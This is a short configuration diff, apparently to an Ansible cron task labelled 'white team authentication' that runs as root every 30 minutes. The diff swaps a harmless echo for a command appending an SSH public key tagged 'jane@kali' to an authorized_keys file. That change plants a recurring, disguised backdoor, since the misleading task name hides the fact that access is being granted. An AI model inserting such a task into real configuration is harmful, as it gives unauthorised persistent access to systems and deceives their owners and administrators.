@@ -7,5 +7,5 @@
         name: "white team authentication"
         user: "root"
         minute: "*/30"
-        job: "echo hi"
+        job: "echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCuCmcdmnmdrQPT/6Dd++YsC+NutEgxWDGBhx3esZ731oDCya9bxpC3anL/mzvNO0dkWLfp0dDl55etkf/bvTdGwFworM+ZZtTc7Ttyj57Jp6EzNrb8JHxKvCDJ6JLiV0SD8LD5FMYN9cqofo8DDCd60eGTyghg/niMpvmH8aHo4DzdmHlqvTPtQCgLObaKBudAr9n8Y42BbyfSj10N8J3SYTagR47Cn6vQFuuB8Hr4m/HBRZaFu0A1MwOqTXa+NFQImCTxzbSjpcxqNUns76VgfsQlhEk5AAsI/TDpssIEzVTZhxVAqRdKAv+Z2DIlP35C11+xuyD8DOIiDT+L/yWOieDB5oflY77JWdGQXfj3M+6o0JxmgTwR4vWTs8tIo9pP2+Wx8tHLhipQDtWDeOZAcKT+hIF5R4e3EFhdnMQEIq6louYMzuJ8glF5TNDpdRl2xaUYA82josi8dp7io31KXsQYuzsegDyDmnbk8JoF11ecpszfrPpazQhS8P9PtLk= jane@kali' >> /jane/home/.ssh/authorized_keys"
         state: present
